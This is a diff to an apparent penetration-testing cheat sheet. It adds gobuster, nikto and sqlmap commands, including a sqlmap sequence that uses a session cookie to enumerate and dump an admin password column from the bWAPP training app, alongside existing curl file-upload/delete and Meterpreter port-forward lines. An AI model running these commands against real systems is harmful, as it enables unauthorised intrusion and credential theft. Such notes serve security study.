@@ -225,18 +225,42 @@ portfwd add -l <local-port> -p <remote-port> -r <ip>
    * crontab -l
    * ls al /etc/cron*
 ```
-## web:
+## Web:
 ```
-dirb :
+Dirb :
  - dirb http://<ip>
 ```
 ```
-curl :
+Curl :
  - curl -X POST <ip>/login.php -d  "name=x&pass=y" -V
  - curl <ip>/uploads/ --uploads-file test.txt ===> to uploads file
  - curl -X DELETE <ip>/uploads/teat.txt       ===> to delete file
 ```
-    
+```
+Gobuster :
+ - gobuster url -u http://<ip> -w /your wordlist path/
+ * - b  404,403        ===> exclude
+ * - x  .php,txt,xml   ===> show this file extensions 
+ * -r                  ===> follow any redirects  
+```
+```
+Nikto :
+ - nikto -h http://<ip>
+```
+```
+Sqlmap :
+#Note : target parmeter => title <== in your case it wil be different
+#Note : get full request from burbsuite or any tool
+
+  - sqlmap -u  "http://<ip>/sql.php?title = <your parmeter request>" --cookie ="<PHPSESSID=your cookie>" -p title --dbs
+  - sqlmap -u  "http://<ip>/sql.php?title = <your parmeter request>" --cookie ="<PHPSESSID=your cookie>" -p title -D bwapp --tables
+  - sqlmap -u  "http://<ip>/sql.php?title = <your parmeter request>" --cookie ="<PHPSESSID=your cookie>" -p title -D bwapp -T users --colums
+  - sqlmap -u  "http://<ip>/sql.php?title = <your parmeter request>" --cookie ="<PHPSESSID=your cookie>" -p title -D bwapp -T users -C adminpassword --dump
+
+ POST Request:
+  sqlmap -r request.txt -p title 
+ 
+```
 
 
 
